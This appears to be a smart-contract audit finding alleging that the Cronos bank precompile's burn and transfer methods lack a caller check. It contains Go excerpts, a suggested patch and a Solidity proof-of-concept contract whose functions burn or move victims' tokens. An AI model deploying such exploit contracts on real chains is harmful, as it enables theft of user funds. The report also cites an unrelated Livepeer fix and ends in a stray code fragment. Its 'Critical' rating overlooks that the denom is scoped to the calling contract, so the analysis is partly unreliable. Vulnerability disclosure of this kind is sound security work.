### Title
Any Smart Contract Can Burn or Transfer `evm/<callerAddress>` Native Tokens From Arbitrary Addresses Without Consent — (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary
The `BankContract` precompile's `burn` and `transfer` methods accept an arbitrary `address` argument (the account to burn from / transfer from) but perform **no check** that this address equals `contract.Caller()` or has authorized the caller. Any deployed smart contract can therefore burn or transfer `evm/<contractAddress>`-denominated native tokens from any address that holds them, without the token holder's consent.

### Finding Description

The `BankContract.Run` handler in `x/cronos/keeper/precompiles/bank.go` handles both `burn` and `transfer` in a single code path.

**`burn` path (lines 113–156):**

```go
case MintMethodName, BurnMethodName:
    recipient := args[0].(common.Address)   // arbitrary address to burn FROM
    amount    := args[1].(*big.Int)
    addr      := sdk.AccAddress(recipient.Bytes())
    // only blocked-address check — no check that addr == contract.Caller()
    denom := EVMDenom(contract.Caller())    // evm/<callerContractAddress>
    // ...
    bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, ...)  // burns from addr
``` [1](#0-0) 

**`transfer` path (lines 167–200):**

```go
case TransferMethodName:
    sender    := args[0].(common.Address)   // arbitrary sender — no check
    recipient := args[1].(common.Address)
    // ...
    denom := EVMDenom(contract.Caller())
    // ...
    bc.bankKeeper.SendCoins(ctx, from, to, ...)  // transfers from arbitrary sender
``` [2](#0-1) 

The denom is always `evm/<contract.Caller()>`, so the calling contract's address scopes the token namespace. However, **within that namespace the calling contract has unrestricted power to burn or transfer tokens from any holder**. There is no `require(addr == msg.sender)` or allowance/approval check of any kind.

The `IBankModule` interface exposed to Solidity contracts makes this surface explicit:

```solidity
function burn(address, uint256) external payable returns (bool);
function transfer(address, address, uint256) external payable returns (bool);
``` [3](#0-2) 

### Impact Explanation

**Critical — Unauthorized burn and transfer of precompile-controlled assets.**

A malicious contract can:
1. Call `bank.burn(victimAddress, amount)` → destroys `evm/<maliciousContract>` native tokens held by `victimAddress` with no consent.
2. Call `bank.transfer(victimAddress, attackerAddress, amount)` → moves `evm/<maliciousContract>` native tokens from victim to attacker with no consent.

These are native Cosmos-layer tokens managed by the bank module. The `evm/<contractAddress>` denom is the canonical representation used by the bank precompile system (as shown in `TestBank.sol` and the integration tests). Users who hold these tokens as receipt/LP tokens in a DeFi protocol built on the bank precompile are fully exposed. [4](#0-3) 

### Likelihood Explanation

Any unprivileged actor can deploy a smart contract. The attacker only needs:
1. A deployed contract (zero privilege required).
2. Victims who hold `evm/<attackerContractAddress>` tokens — achievable by operating a DeFi protocol (staking, LP, rewards) that mints these tokens to users.

Once users hold the tokens, the attacker can burn or transfer them at will by calling the bank precompile from their contract.

### Recommendation

In `BankContract.Run`, for the `burn` case, enforce that the address being burned from equals `contract.Caller()`:

```go
// burn: only allow burning from the calling contract itself
if recipient != contract.Caller() {
    return nil, errors.New("burn: can only burn from caller's own address")
}
```

For the `transfer` case, enforce that the `sender` argument equals `contract.Caller()`:

```go
// transfer: only allow transferring from the calling contract itself
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be caller")
}
```

This mirrors the fix applied to L2LivepeerToken: restrict destructive operations to `msg.sender` only, removing the ability to act on behalf of arbitrary addresses. [5](#0-4) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract BankPrecompileExploit {
    address constant BANK = 0x0000000000000000000000000000000000000064;
    IBankModule bank = IBankModule(BANK);

    // Step 1: Operate as a "legitimate" protocol — mint evm/<this> tokens to users
    function depositAndEarn(address user, uint256 amount) external {
        bank.mint(user, amount);  // user now holds evm/<this> tokens
    }

    // Step 2: Rug — burn all tokens from any holder without consent
    function rugBurn(address victim, uint256 amount) external {
        bank.burn(victim, amount);  // no approval needed
    }

    // Step 3: Steal — transfer victim's tokens to attacker
    function rugTransfer(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);  // no approval needed
    }
}
```

`rugBurn` and `rugTransfer` succeed because `BankContract.Run` never verifies that `victim == contract.Caller()`. The denom `evm/<BankPrecompileExploit>` is burned/transferred from `victim`'s native bank balance with no consent check. [6](#0-5) [7](#0-6)

func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
